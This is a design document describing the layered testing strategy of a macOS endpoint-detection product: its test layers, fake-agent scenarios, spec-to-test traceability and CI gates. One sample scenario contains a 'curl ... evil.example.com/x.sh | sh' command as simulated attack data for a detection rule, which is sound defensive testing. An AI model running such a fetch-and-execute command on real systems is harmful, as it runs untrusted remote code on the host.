# Testing strategy

How this repo proves the product works end to end: the layers, what runs where, the reusable artefacts that make each
layer cheap, and the rules a new contributor follows when adding code.

## Goals

- Fast feedback for the developer: unit tests run in seconds, the per-PR integration layers run in single-digit minutes.
- Honest coverage of the wire contract between agent, server, and UI: a regression at the integration boundary fails CI
  on the PR that introduced it, not at release time.
- Coverage of the macOS extension code in a way that does not require a live ESF kernel hook on every PR.
- Detection content is treated like any other code: every shipped rule has a scenario that proves it fires.
- One CI gate per layer so a reviewer can see at a glance which layer caught a regression.

Specs in `openspec/specs/**/spec.md` are the behavioural contract; the test layers below collectively prove the
contract is met.

## The test pyramid

The pyramid concept is the standard one (Cohn, _Succeeding with Agile_, 2009; refined as Google's
Small / Medium / Large test sizes). The compact `L0` to `L6` labels below are a repo-internal shorthand so we can talk
about "all lower layers must be green first" without listing them; the descriptive name is the canonical name and is
preferred in prose, PR descriptions, and commit messages.

```text
                       ____ Detection efficacy   (L6, nightly + RC)
                      /____ System / VM E2E      (L5, RC + scheduled)
                     /_____ Browser E2E + fake agent  (L4, per PR)
                    /______ Headless agent + server   (L3, per PR)
                   /_______ Cross-context integration (L2, per PR)
                  /________ Per-context integration   (L1, per PR)
                 /_________ Unit                      (L0, per PR)
```

| Layer | What it proves | Speed (target) | Trigger |
|---|---|---|---|
| Unit (L0) | Single-package correctness, error paths, table cases, property-based invariants | < 30 s per package | every PR |
| Per-context integration (L1) | Each bounded context's services work against real MySQL | < 90 s | every PR |
| Cross-context integration (L2) | Endpoint -> rules -> detection -> response with the HTTP boundary | < 2 min | every PR |
| Headless agent + server (L3) | Real agent Go code (queue + uploader + commander) talks to a real server | < 3 min | every PR |
| Browser E2E + fake agent (L4) | UI renders the data path that ingestion + detection produced | < 8 min | every PR |
| System / VM E2E (L5) | Real Swift extensions + real agent + real server on macOS | ~ 30 min | RC + scheduled |
| Detection efficacy (L6) | MITRE-aligned attack corpus -> assert rule fires within SLA | ~ 15 min | nightly + RC |

A run at any layer implies all lower layers have already passed; CI gates enforce that.

## Layer details

### Unit (L0)

- Per-package Go tests, co-located with the code.
- Vitest + V8 coverage for `ui/`.
- XCTest for Swift code in `extension/edr/` that does not require ESF or Network Extension framework objects.
- Style guide: see `## Testing` in `CLAUDE.md` and `docs/go-conventions.md`. Table-driven by default, property-based
  via `pgregory.net/rapid` for invariants, `go test -fuzz` for untrusted input parsers.

### Per-context integration (L1)

- Per-context tests live in `server/<context>/internal/tests/`, `package tests`.
- They use real MySQL via `testdb/full.Open(t)`, which spins an isolated per-test database with all five context
  schemas pre-applied.
- Every new public service method on a bounded context must add at least one case here.

### Cross-context integration (L2)

- `test/integration/`, `package integration`.
- Composes all five bounded contexts the way `cmd/fleet-edr-server/main.go` does, exposed over a `httptest` server.
- Used for journeys that cross context boundaries (enroll -> ingest -> detect -> respond -> command ack).

### Headless agent + server (L3)

- The Go core of the agent (queue, uploader, enrolment) runs in CI against the real server, on Linux, with the macOS
  extension dependency stubbed out behind build tags.
- The macOS-only packages (`agent/receiver`, `agent/xpcbridge`) are split with build tags: `//go:build darwin && cgo`
  for the CGo XPC implementation, `//go:build !darwin || !cgo` for the stub receiver. The stub exposes an `Inject`
  entry point so the headless binary and tests can deliver events as if they had arrived from the XPC peer. The
  production agent's call sites use `*receiver.Receiver` directly; the build tags select the right struct per
  platform without an interface. UAT plan milestone **M1** delivered this split; the linux compile invariant is
  enforced by `task build:agent:linux` in CI (`agent-test` job).
- The headless binary `agent/cmd/fleet-edr-agent-headless` wires the same `queue + uploader + enrollment` pipeline as
  production but with the stub receiver, and exposes a small local control plane on a unix socket:
  - `POST /event`: inject one JSON event into the stub receiver's events channel.
  - `GET /state`: return `{events_injected, inject_errors, last_inject_at_unix, queue_depth}`.
  Built by `task build:agent:headless` (also gated in CI). UAT plan milestone **M2** delivered this binary; the L3
  end-to-end CI job that drives it with a YAML scenario corpus lands in **M3** at `test/integration/agentserver/`.

### Browser E2E with the fake agent (L4)

- Playwright tests live in `test/e2e/`. Real server + real MySQL + real UI; tests start the server via the
  `webServer` block in `playwright.config.ts`.
- For tests that need realistic agent data (process trees, alerts, app-control flow, host list), the spec drives the
  fake-agent control plane to inject a scenario, waits for the events to land, then drives the UI.
- For pure auth/RBAC/session tests, direct SQL fixtures under `test/e2e/fixtures/db.ts` remain the right tool; they
  are faster and the data they seed is not exercised through the ingestion path.
- CI runs Playwright in phases (`scripts/test-e2e-coverage.sh`) so env-isolation tests (rate limits, short session
  timeouts, IP allowlist) get their own server lifetime.

### System / VM end-to-end (L5)

- Real macOS VM with SIP and Gatekeeper enabled, fresh snapshot per run.
- The VM mirrors the pilot-customer environment: stock macOS, no Xcode, no Homebrew, no developer tools beyond what a
  signed PKG install actually delivers. Snapshots revert to a known-good "clean-pre-install" state for each run so
  signing, notarization, and extension activation are exercised every time.
- Driven by `scripts/uat/system-test.sh` (or equivalent). The script uses `ssh` to connect to the VM, installs the
  candidate signed PKG, waits for extension activation and agent enrolment, runs an attack scenario from
  `test/efficacy/corpus/<technique>/attack.sh`, and asserts on server state via REST.
- Runs on a self-hosted runner (the GitHub-hosted macOS runners do not allow nested virtualisation or expose the ESF
  entitlement). Schedule + RC tag, never per PR.
- Setting up a local VM for this layer: see `docs/install-agent-manual.md` and `docs/install-server.md`. The exact
  VM tool (UTM, VMware Fusion, Parallels) is the contributor's choice; the only requirements are SIP-enabled,
  Gatekeeper-enabled, snapshot-capable, and reachable over SSH from the runner host.

### Detection efficacy (L6)

- `test/efficacy/corpus/T<MITRE-id>/` per attack technique. Each folder ships:
  - `scenario.yaml`: a fake-agent scenario (consumed by the headless and browser E2E layers).
  - `attack.sh`: a shell driver that runs the technique on a live VM (consumed by the system / VM layer).
  - `expected.yaml`: the detection assertions (which rule fires, within what SLA, severity). Shared between modes.
- The test runner ranges over the corpus and produces a per-technique pass/fail report.
- Hard gate: per-technique detection rate >= 95%, false-positive rate on ambient-noise scenarios <= 1%.

### Soak, scale, chaos (out of scope for per-PR CI)

A first scale baseline ships with the rest of the plan: 100 simulated agents against a single server + MySQL stack
for 30 minutes, recorded baseline checked into the repo. Longer soak runs, 500-agent scale, MySQL/server/cert/OIDC
chaos, and the operational tooling for all of them (`tools/chaosctl/`) are tracked separately. The fake-agent library
and headless binary are the shared substrate.

## Reusable artefacts

### Fake agent and headless agent binary

The same library serves multiple consumers, so the wire contract is exercised end to end at every layer that uses it:

- `test/fakeagent/`: Go library (UAT plan **M3**). Loads YAML scenarios, emits wire-format envelopes with deterministic
  timestamps, and feeds them either through the headless binary's `POST /event` control plane (`FeedControlPlane`) or
  directly to a server's ingest endpoint with a bearer token (`PostDirect`). Functional options cover start time, host
  id override, playback speed multiplier, and `PostDirect` batch size.
- `agent/cmd/fleet-edr-agent-headless`: production agent built with the stub receiver, plus an opt-in unix-socket control
  plane for tests. Doubles as the load generator.
- `test/fakeagent/scenarios/`: starter YAML scenarios shipped with M3 (`quiet-host`, `exec-fork-exit`,
  `dns-and-network`). The M10 efficacy corpus and the L3 integration job add their own scenarios under separate paths.

A scenario file looks like:

```yaml
name: "Suspicious curl | sh"
mitre: T1059.004
host:
  id: aa-bb-cc-dd-ee-ff
  hostname: lab-mac.local
  os: macOS 14.4
timeline:
  - {at: 0ms,   type: fork, child_pid: 4001, parent_pid: 1}
  - {at: 5ms,   type: exec, pid: 4001, ppid: 1, path: /bin/zsh,
       args: ["zsh", "-c", "curl https://evil.example.com/x.sh | sh"],
       cwd: /tmp, uid: 501, gid: 20}
  - {at: 10ms,  type: fork, child_pid: 4002, parent_pid: 4001}
  - {at: 12ms,  type: exec, pid: 4002, ppid: 4001, path: /usr/bin/curl,
       args: ["curl", "https://evil.example.com/x.sh"],
       cwd: /tmp, uid: 501, gid: 20}
  - {at: 50ms,  type: network_connect, pid: 4002, protocol: tcp, direction: outbound,
       remote_address: 203.0.113.7, remote_port: 443}
  - {at: 200ms, type: exit, pid: 4002, exit_code: 0}
assertions:
  - within: 5s
    rule: suspicious-curl-pipe-sh
    severity: high
```

The library exposes deterministic-timestamp and host-multiplexing options so the same scenario can run as a
single-host repro in CI or as a 100-host fleet for the scale baseline.

### Captured ESF event corpus

`EventSerializer` in the system extension consumes opaque `es_message_t` instances; we cannot construct those in user
space. Instead, captured serializer outputs are committed under `extension/edr/Tests/corpus/<macOS-version>/<scenario>/`
as gzipped JSON. An XCTest replays them through the real `EventSerializer` and asserts on the emitted JSON. When the
wire format changes intentionally, the goldens are regenerated and the diff is reviewed in the PR.

## Spec-to-test traceability

Spec scenarios in `openspec/specs/**/spec.md` are linked to tests by canonical ID.

### ID scheme

Mechanical, derived from heading text:

```text
openspec/specs/server-event-ingestion/spec.md
  ### Requirement: Authenticated batch event submission
  #### Scenario: A valid agent posts a batch
```

becomes

```text
server-event-ingestion/authenticated-batch-event-submission/a-valid-agent-posts-a-batch
```

The slug rule is: lowercase, replace runs of non-alphanumeric characters with `-`, strip leading and trailing
dashes. `tools/spectrace --list-ids` prints the canonical ID for every scenario so contributors do not type IDs by
hand.

### Marker conventions

Tests reference the canonical ID. Any of the following forms work; the linter accepts all of them:

**Go subtest name:**

```go
t.Run("spec:server-event-ingestion/authenticated-batch-event-submission/a-valid-agent-posts-a-batch", func(t *testing.T) {
    // ...
})
```

**Go table-driven, via a `Spec` field that becomes the subtest name:**

```go
cases := []struct {
    Spec string
    Name string
    // ...
}{
    {Spec: "server-event-ingestion/required-field-validation/a-batch-contains-an-event-with-a-missing-field",
     Name: "missing event_id"},
}
```

**Go comment marker (when keeping the subtest name short matters):**

```go
// spec:server-event-ingestion/required-field-validation/a-batch-contains-an-event-with-a-missing-field
t.Run("missing event_id", func(t *testing.T) { /* ... */ })
```

**Playwright title prefix:**

```ts
test("spec:ui-authentication-session/break-glass-redemption/operator-redeems-bootstrap-token renders dashboard", ...);
```

**Swift XCTest (identifiers cannot carry slashes, so dashes become underscores):**

```swift
func test_spec_extension_xpc_server_peer_validation_signing_required() throws { /* ... */ }
```

### The linter

`tools/spectrace check` walks `openspec/specs/**/spec.md`, computes canonical IDs for every `#### Scenario:` under a
`### Requirement:` whose body contains SHALL or MUST, then walks the codebase for matching markers. It fails when:

- A SHALL / MUST scenario has zero references.
- A reference points to an ID that does not exist (catches drift after a spec rename).

`tools/spectrace report --format=md` produces a coverage matrix with one row per scenario and one column per layer,
linking to the test that covers it.

Rollout is phased so the gate never goes red on day one: advisory first, then "new code" gate (every scenario added or
modified in a PR must be covered), then full gate. The same "new code" framing that SonarCloud uses.

## Minimum requirements per PR

These are the rules a contributor follows when adding code. They are enforced partly by CI and partly by code review:

1. **New wire-format struct or event field**: add a property-based round-trip test
   (`Marshal . Unmarshal == identity`). Already enforced by the existing PBT habit; see the decision matrix in
   `CLAUDE.md`.
2. **New detection rule under `server/rules/internal/catalog/`**: ship a scenario at
   `test/efficacy/corpus/T<MITRE-id>/` with both `scenario.yaml` (consumed by the headless and browser E2E layers) and
   `expected.yaml` (assertions). Add `attack.sh` when the rule needs system / VM coverage to be honest.
3. **Agent or extension change touching ESF, XPC, or the event wire format**: must be exercised on a live macOS VM
   (the system / VM layer) before the release-candidate tag. Flag the change in the PR description so a reviewer can
   confirm the VM run happened.
4. **New or modified SHALL / MUST scenario in `openspec/specs/`**: at least one test must reference the canonical
   scenario ID. `tools/spectrace --list-ids` prints the IDs; pick one of the marker forms above.
5. **Symbol deletion**: scrub every doc comment, IPC dispatcher reference, and adjacent doc that still names the
   deleted symbol. Stale comments in IPC-adjacent code are a recurring class of footgun (see `CLAUDE.md`).

## CI tiering

| Trigger | Layers run | Wall-time budget |
|---|---|---|
| Every PR | Unit through browser E2E (L0 to L4) + `spectrace` advisory | < 20 min total (parallelised) |
| Nightly on `main` | + detection efficacy (L6) + small soak | < 90 min |
| Release-candidate tag | + system / VM (L5) + detection efficacy full corpus + 100-agent scale | < 4 hours |
| Manual pre-pilot | System / VM (L5) with the pilot's specific environment knobs | as needed |

The `changes` gate-then-analyze pattern in `.github/workflows/test.yml` is preserved; jobs only fire when their
relevant inputs change.

## Coverage gates

| Layer | Tooling | Gate |
|---|---|---|
| Unit (Go) | `go test -coverpkg=./server/...,./agent/...,./internal/...` | Sonar 80% on new code |
| Unit (TS) | `vitest --coverage` (V8) | Sonar 80% on new code |
| Unit (Swift) | `xcodebuild test -enableCodeCoverage YES` | Sonar 80% on new code (same unified gate as Go and TS) |
| Integration layers (per-context, cross-context, headless) | wide `-coverpkg`, merged via `go tool covdata textfmt` | feeds the same Sonar Go gate |
| Browser E2E | monocart V8 coverage, merged into `lcov-e2e.info` | feeds the Sonar TS gate |
| System / VM | per-scenario pass/fail; no line coverage | green/red checklist in the workflow run |
| Detection efficacy | per-technique detection rate >= 95%, FP rate <= 1% on ambient noise | hard gate |
| Spec traceability | `tools/spectrace check` | phased: advisory -> new-code -> full |

## References

- `docs/best-practices.md`: industry checklist; the testing section maps onto the layers above.
- `docs/adr/0004-modular-monolith-bounded-contexts.md`: the bounded contexts the per-context and cross-context layers
  are organised around.
- `docs/go-conventions.md`: style and idiom rules.
- `openspec/specs/`: the behavioural contract that `spectrace` enforces against.
- ISO 29148, DO-178C, IEC 62304: requirements traceability matrix in safety-critical domains; the lighter-weight
  marker-and-linter pattern used here adapts the same idea.
- Kubernetes conformance suite: `[Conformance]` tagging of e2e tests is the same shape as our scenario IDs.
